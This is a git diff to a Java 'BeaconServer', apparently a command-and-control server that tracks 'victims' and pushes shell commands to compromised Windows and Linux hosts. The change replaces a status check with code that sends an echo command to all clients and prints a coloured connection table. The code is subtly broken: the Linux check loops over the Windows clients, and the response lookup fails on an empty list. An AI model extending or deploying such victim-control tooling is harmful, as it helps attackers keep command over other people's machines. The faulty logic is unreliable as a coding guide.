@@ -28,6 +28,10 @@ public class BeaconServer implements Runnable{
     // Boolean to determine if server should remain running
     private boolean sentinel = true;
 
+    // Text colors for Hard visuals
+    private String GREEN = "\u001B[32m";
+    private String RESET = "\u001B[37m";
+    private String RED = "\u001B[31m";
 
     /**
      * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
@@ -157,97 +161,51 @@ public class BeaconServer implements Runnable{
      * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
      * communicate with the Beacon, False if the client cannot communicate with the Beacon
      */
-    protected HashMap<String, Boolean> getClientStatus(String Scope){
+    protected String getClientStatus(){
         // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
         // True if the client is still active, false if the client is no longer active.
         HashMap<String, Boolean> clientStatus = new HashMap<>();
 
-        // Send Status messages based on the Scope of the request
-        if(Scope.equals("Windows") || Scope.equals("All")){
-            synchronized(windowsClientObjects){
-                for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
-                    clientHandler.sendToClient("TODO: Figure out how we want to check the status of a client");
-                }
-            }
+        // Check all Windows Boxes
+        distributeCommands("Windows", "echo 'Hello World'");
+        for (String ip : windowsClientObjects.keySet()){
+            ArrayList<String> responses = getSingleClientResponses(ip);
+        if (responses.get(responses.size()-1).equals("Hello World")){
+            clientStatus.put(ip, true);
         }
-        if(Scope.equals("Linux") || Scope.equals("All")){
-            synchronized(linuxClientObjects){
-                for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
-                    clientHandler.sendToClient("TODO: Figure out how we want to check the status of a client");
-                }
-            }
+        else {
+            clientStatus.put(ip, false);
         }
-        // If the Scope contains a . (i.e. the Scope is an IP Address)
-        if(Scope.contains(".")){
-            synchronized(windowsClientObjects){
-                synchronized(linuxClientObjects){
-                    if(windowsClientObjects.keySet().contains(Scope)){
-                        windowsClientObjects.get(Scope).sendToClient("TODO: Figure out how we want to check the status of a client");
-                    } else if(linuxClientObjects.keySet().contains(Scope)){
-                        linuxClientObjects.get(Scope).sendToClient("TODO: Figure out how we want to check the status of a client");
-                    }
-                }
-            }
+        }
+        // Check all Linux Boxes
+        distributeCommands("Linux", "echo 'Hello World'");
+        for (String ip : windowsClientObjects.keySet()){
+            ArrayList<String> responses = getSingleClientResponses(ip);
+        if (responses.get(responses.size()-1).equals("Hello World")){
+            clientStatus.put(ip, true);
+        }
+        else {
+            clientStatus.put(ip, false);
+        }
         }
         
 
-        // Wait 15 seconds to give all of the clients time to respond.
-        try{
-            wait(15000);
-        }catch(InterruptedException e){
-            e.printStackTrace();
-        }
-        
-
-        // Check status' of clients based on the scope of the request
-        if(Scope.equals("Windows") || Scope.equals("All")){
-            synchronized(windowsClientResponses){
-                for(String client: windowsClientResponses.keySet()){
-                    if(windowsClientResponses.get(client).contains("TODO Figure out how we want to check the status of a client")){
-                        clientStatus.put(client, true);
-                        windowsClientResponses.get(client).remove("TODO Figure out how we want to check the status of a client");
-                    } else {
-                        clientStatus.put(client, false);
-                    }
-                }
+        // Creating fire visually pleasing table of client status
+        String table = "_____________________________________\n";
+        table += "|\tIP:\t\t Connection Status:\t|\n";
+        table += "|__________________________________________|\n";
+        for(String ip : clientStatus.keySet()){
+            String status;
+            if (clientStatus.get(ip) == true) {
+                status = GREEN +"CONNECTED :D" + RESET;
             }
-        }
-        if(Scope.equals("Linux") || Scope.equals("All")){
-            synchronized(linuxClientResponses){
-                for(String client: linuxClientResponses.keySet()){
-                    if(linuxClientResponses.get(client).contains("TODO Figure out how we want to check the status of a client")){
-                        clientStatus.put(client, true);
-                        linuxClientResponses.get(client).remove("TODO Figure out how we want to check the status of a client");
-                    } else {
-                        clientStatus.put(client, false);
-                    }
-                }
+            else {
+                status = RED + "DISCONNECTED D:" + RESET;
             }
+            table += "|\t" +ip + ":\t|\t" + status + "\t|";
         }
-        // If the Scope contains a . (i.e. the Scope is an IP Address)
-        if(Scope.contains(".")){
-            synchronized(windowsClientResponses){
-                synchronized(linuxClientResponses){
-                    if(windowsClientResponses.keySet().contains(Scope)){
-                        if(windowsClientResponses.get(Scope).contains("TODO Figure out how we want to check the status of a client")){
-                            clientStatus.put(Scope, true);
-                            windowsClientResponses.get(Scope).remove("TODO Figure out how we want to check the status of a client");
-                        } else {
-                            clientStatus.put(Scope, false);
-                        }
-                    } else if(linuxClientResponses.keySet().contains(Scope)){
-                        if(linuxClientResponses.get(Scope).contains("TODO Figure out how we want to check the status of a client")){
-                            clientStatus.put(Scope, true);
-                            linuxClientResponses.get(Scope).remove("TODO Figure out how we want to check the status of a client");
-                        } else {
-                            clientStatus.put(Scope, false);
-                        }
-                    }
-                }
-            }
-        }
-
-        return clientStatus;
+        table += "|__________________________________________|\n";
+        return table;
     }
 
     protected void stopServer(){
